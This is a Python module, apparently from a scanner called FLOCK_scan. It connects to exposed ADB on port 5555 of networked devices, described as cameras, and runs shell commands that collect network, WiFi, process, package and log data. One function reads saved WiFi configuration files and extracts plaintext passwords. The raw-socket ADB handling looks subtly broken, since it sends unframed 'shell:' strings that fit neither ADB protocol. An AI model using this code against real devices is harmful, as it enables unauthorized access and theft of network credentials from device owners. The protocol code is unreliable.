#!/usr/bin/env python3
"""
adb_deep.py — Extended ADB shell data collection for FLOCK_scan

When ADB is accessible on port 5555, we can pull far more than just
ro.product.model. This module collects:
  - Network: gateway, DNS servers, interfaces, ARP table
  - WiFi: SSID, BSSID, signal strength
  - System: uptime, processes, mounts, disk usage
  - Battery / power state
  - Installed packages
  - Logcat errors (if accessible)

Usage:
    from modules.adb_deep import adb_deep_collect
    data = adb_deep_collect(host, timeout=5)
"""

import socket
import re
import time
import json


ADB_PORT = 5555


def _adb_shell(host, cmd, timeout=5):
    """Send a shell command over raw ADB TCP and return output."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, ADB_PORT))

        # ADB shell protocol: send "shell:<cmd>\n"
        payload = f"shell:{cmd}\n"
        s.send(payload.encode())

        # Read response
        # Skip the 4-byte ADB status header
        time.sleep(0.3)
        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        s.close()

        # ADB responses start with "OKAY" or "FAIL" (4 bytes)
        text = response.decode(errors="replace")
        if text.startswith("OKAY"):
            text = text[4:]
        elif text.startswith("FAIL"):
            return None

        return text.strip()
    except Exception:
        return None


def get_prop(host, prop, timeout=5):
    """Get a single Android system property."""
    return _adb_shell(host, f"getprop {prop}", timeout=timeout)


def get_gateway(host, timeout=5):
    """Get default gateway from the camera."""
    out = _adb_shell(host, "ip route | grep default", timeout=timeout)
    if out:
        m = re.search(r'via\s+([0-9.]+)', out)
        if m:
            return m.group(1)
    return None


def get_dns_servers(host, timeout=5):
    """Get configured DNS servers."""
    dns1 = get_prop(host, "net.dns1", timeout=timeout)
    dns2 = get_prop(host, "net.dns2", timeout=timeout)
    return {"dns1": dns1, "dns2": dns2}


def get_wifi_info(host, timeout=5):
    """Extract WiFi connection details via dumpsys."""
    out = _adb_shell(host, "dumpsys wifi 2>/dev/null | grep -E 'mWifiInfo|SSID|BSSID|RSSI|LinkSpeed|Frequency'", timeout=timeout)
    info = {}
    if out:
        for line in out.split("\n"):
            if "SSID" in line or "ssid" in line:
                m = re.search(r'["\']([^"\']+)["\']', line)
                if m:
                    info["ssid"] = m.group(1)
            if "BSSID" in line:
                m = re.search(r'([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})', line, re.I)
                if m:
                    info["bssid"] = m.group(1).lower()
            if "RSSI" in line:
                m = re.search(r'(-?\d+)', line)
                if m:
                    info["rssi"] = int(m.group(1))
            if "LinkSpeed" in line:
                m = re.search(r'(\d+)', line)
                if m:
                    info["link_speed"] = int(m.group(1))  # Mbps
            if "Frequency" in line:
                m = re.search(r'(\d+)', line)
                if m:
                    freq = int(m.group(1))
                    info["frequency"] = freq
                    info["band"] = "5GHz" if freq > 4000 else "2.4GHz"
    return info if info else None


def get_interfaces(host, timeout=5):
    """List all network interfaces and their IP addresses."""
    out = _adb_shell(host, "ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null", timeout=timeout)
    interfaces = []
    if out:
        for line in out.split("\n"):
            m = re.match(r'(\d+):\s+(\w+)[:@]', line)
            if m:
                iface = {"index": m.group(1), "name": m.group(2)}
                interfaces.append(iface)
            elif "inet " in line and interfaces:
                m2 = re.search(r'inet\s+([0-9.]+)/(\d+)', line)
                if m2:
                    interfaces[-1]["ip"] = m2.group(1)
                    interfaces[-1]["prefix"] = int(m2.group(2))
    return interfaces if interfaces else None


def get_arp_table(host, timeout=5):
    """Get the ARP table."""
    out = _adb_shell(host, "cat /proc/net/arp", timeout=timeout)
    entries = []
    if out:
        for line in out.split("\n")[1:]:  # skip header
            parts = line.split()
            if len(parts) >= 4:
                entries.append({
                    "ip": parts[0],
                    "hw_type": parts[1],
                    "flags": parts[2],
                    "mac": parts[3],
                    "iface": parts[-1] if len(parts) > 4 else None,
                })
    return entries if entries else None


def get_uptime(host, timeout=5):
    """Get system uptime."""
    out = _adb_shell(host, "uptime", timeout=timeout)
    if out:
        m = re.search(r'up\s+(.+?),\s', out)
        if m:
            return m.group(1).strip()
    return out


def get_process_list(host, timeout=5):
    """Get running processes."""
    out = _adb_shell(host, "ps -A 2>/dev/null || ps 2>/dev/null", timeout=timeout)
    processes = []
    if out:
        for line in out.split("\n")[1:]:  # skip header
            parts = line.split()
            if len(parts) >= 8:
                processes.append({
                    "user": parts[0],
                    "pid": parts[1],
                    "ppid": parts[2],
                    "cpu": parts[3] if len(parts) > 3 else "?",
                    "name": parts[-1],
                })
    return processes if processes else None


def get_mounts(host, timeout=5):
    """Get mounted filesystems."""
    out = _adb_shell(host, "mount", timeout=timeout)
    mounts = []
    if out:
        for line in out.split("\n"):
            parts = line.split()
            if len(parts) >= 3 and parts[0].startswith("/"):
                mounts.append({
                    "device": parts[0],
                    "mount_point": parts[1],
                    "fstype": parts[2],
                    "options": parts[3].strip("()") if len(parts) > 3 else "",
                })
    return mounts if mounts else None


def get_disk_usage(host, timeout=5):
    """Get disk usage summary."""
    out = _adb_shell(host, "df -h 2>/dev/null", timeout=timeout)
    disks = []
    if out:
        for line in out.split("\n")[1:]:
            parts = line.split()
            if len(parts) >= 5 and parts[0].startswith("/"):
                disks.append({
                    "filesystem": parts[0],
                    "size": parts[1],
                    "used": parts[2],
                    "avail": parts[3],
                    "use_pct": parts[4],
                    "mounted": parts[5] if len(parts) > 5 else "",
                })
    return disks if disks else None


def get_installed_packages(host, timeout=5):
    """Get list of installed packages (APKs)."""
    out = _adb_shell(host, "pm list packages -f 2>/dev/null", timeout=timeout)
    packages = []
    if out:
        for line in out.split("\n"):
            if "package:" in line:
                m = re.search(r'package:([^=]+)=(.*)', line)
                if m:
                    packages.append({
                        "path": m.group(1),
                        "name": m.group(2),
                    })
    return packages if packages else None


def get_logcat_errors(host, max_lines=50, timeout=5):
    """
    Grab recent logcat entries with ERROR or FATAL tags.
    Can leak stack traces, internal paths, debug info.
    """
    out = _adb_shell(
        host,
        f"logcat -d -v brief *:E 2>/dev/null | head -{max_lines}",
        timeout=timeout,
    )
    if out:
        lines = out.split("\n")
        return [l.strip() for l in lines if l.strip()]
    return None


def get_battery_info(host, timeout=5):
    """Get battery state via dumpsys."""
    out = _adb_shell(host, "dumpsys battery 2>/dev/null", timeout=timeout)
    info = {}
    if out:
        for line in out.split("\n"):
            if ":" in line:
                k, v = line.split(":", 1)
                info[k.strip()] = v.strip()
    return info if info else None


def get_wifi_credentials(host, timeout=5):
    """Attempt to extract saved WiFi credentials (if rooted)."""
    out = _adb_shell(
        host,
        "cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || "
        "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null",
        timeout=timeout,
    )
    networks = []
    if out:
        # Parse wpa_supplicant.conf
        current = {}
        for line in out.split("\n"):
            m = re.match(r'\s+ssid="([^"]+)"', line)
            if m:
                current["ssid"] = m.group(1)
            m = re.match(r'\s+psk="([^"]+)"', line)
            if m:
                current["psk"] = m.group(1)
            if line.strip() == "}" and current:
                networks.append(current)
                current = {}
    return networks if networks else None


# ── Orchestrator ─────────────────────────────────────────────────────

def adb_deep_collect(host, timeout=5):
    """
    Run all ADB deep-collection commands on a host.
    Returns a dict with all findings, or None if ADB is not reachable.
    """
    # Quick reachability check
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, ADB_PORT))
        s.close()
    except Exception:
        return None

    results = {}

    results["model"] = get_prop(host, "ro.product.model", timeout)
    results["device"] = get_prop(host, "ro.product.device", timeout)
    results["android_version"] = get_prop(host, "ro.build.version.release", timeout)
    results["build_fingerprint"] = get_prop(host, "ro.build.fingerprint", timeout)

    results["gateway"] = get_gateway(host, timeout)
    results["dns"] = get_dns_servers(host, timeout)
    results["wifi"] = get_wifi_info(host, timeout)
    results["interfaces"] = get_interfaces(host, timeout)
    results["arp"] = get_arp_table(host, timeout)

    results["uptime"] = get_uptime(host, timeout)
    results["process_count"] = len(get_process_list(host, timeout) or [])
    results["mounts"] = get_mounts(host, timeout)
    results["disk"] = get_disk_usage(host, timeout)
    results["battery"] = get_battery_info(host, timeout)

    # Optional: slower operations
    results["package_count"] = len(get_installed_packages(host, timeout) or [])
    results["logcat_errors"] = get_logcat_errors(host, timeout=timeout)

    return results


# ── CLI test ─────────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
    print(json.dumps(adb_deep_collect(target), indent=2, default=str))
